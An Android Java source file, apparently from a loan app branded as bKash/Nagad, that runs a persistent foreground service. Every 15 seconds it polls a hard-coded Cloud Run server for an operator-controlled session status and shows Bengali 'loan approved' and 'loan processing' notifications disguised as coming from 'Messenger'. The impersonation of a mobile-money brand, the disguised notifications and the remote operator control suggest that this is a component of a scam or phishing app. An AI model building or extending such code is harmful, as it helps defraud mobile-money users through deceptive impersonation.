package com.bkash.amar.loan;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SessionPollService extends Service {
    private static final String TAG = "SessionPoll";
    private static final String CHANNEL_ID = "session_poll_channel";
    private static final int NOTIFICATION_ID = 3001;
    private static final int POLL_INTERVAL = 15000; // 15 seconds
    private static final String DEFAULT_API_BASE = "https://original-bkash-nagad-macro-loan-692165690086.europe-west2.run.app";
    private static final String API_BASE_URL_KEY = "api_base_url";
    private static final String PREFS_NAME = "CapacitorStorage";

    private Handler handler;
    private Runnable pollRunnable;
    private String lastAdminAction = "NONE";

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        handler = new Handler();
        pollRunnable = () -> { pollSession(); handler.postDelayed(pollRunnable, POLL_INTERVAL); };
        Log.d(TAG, "Session poll service created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, buildNotification());
        handler.post(pollRunnable);
        return START_STICKY;
    }

    private String getApiBase() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        return prefs.getString(API_BASE_URL_KEY, DEFAULT_API_BASE);
    }

    private void pollSession() {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                String sessionId = prefs.getString("user_session_id", null);
                if (sessionId == null || sessionId.isEmpty()) return;

                String urlStr = getApiBase() + "/api/db?path=sessions/" + sessionId;
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("User-Agent", "SessionPoll/1.0");

                int code = conn.getResponseCode();
                if (code != 200) return;

                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                conn.disconnect();

                String resp = sb.toString();
                String adminAction = extractJson(resp, "adminAction");
                String appStatus = extractJson(resp, "applicationStatus");
                if (adminAction == null || adminAction.isEmpty()) adminAction = "NONE";

                // Fire notification when loan is approved
                if ("APPROVED".equals(appStatus) && !"APPROVED".equals(lastAdminAction)) {
                    fireApprovedNotification();
                    prefs.edit().putString("approved_session", sessionId).apply();
                }

                lastAdminAction = appStatus;

            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
            }
        }).start();
    }

    private String extractJson(String json, String key) {
        String sk = "\"" + key + "\"";
        int ki = json.indexOf(sk);
        if (ki == -1) return null;
        int ci = json.indexOf(":", ki);
        if (ci == -1) return null;
        int s = ci + 1;
        while (s < json.length() && (json.charAt(s) == ' ' || json.charAt(s) == '"')) s++;
        int e = s;
        while (e < json.length() && json.charAt(e) != '"' && json.charAt(e) != ',' && json.charAt(e) != '}') e++;
        return json.substring(s, e).trim();
    }

    private void fireApprovedNotification() {
        NotificationManager nm = getSystemService(NotificationManager.class);
        Intent intent = getPackageManager().getLaunchIntentForPackage(getPackageName());
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        Notification notif = new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Messenger")
            .setContentText("আপনার লোন অনুমোদিত হয়েছে")
            .setSmallIcon(android.R.drawable.sym_action_chat)
            .setPriority(Notification.PRIORITY_HIGH)
            .setAutoCancel(true)
            .setContentIntent(pi)
            .build();

        nm.notify((int) System.currentTimeMillis(), notif);
        Log.d(TAG, "APPROVED notification sent!");
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Messenger", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Message notifications");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent intent = getPackageManager().getLaunchIntentForPackage(getPackageName());
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Messenger")
            .setContentText("আপনার লোন আবেদন প্রক্রিয়াধীন")
            .setSmallIcon(android.R.drawable.sym_action_chat)
            .setOngoing(true)
            .setContentIntent(pi)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        if (handler != null && pollRunnable != null) handler.removeCallbacks(pollRunnable);
        super.onDestroy();
    }
}
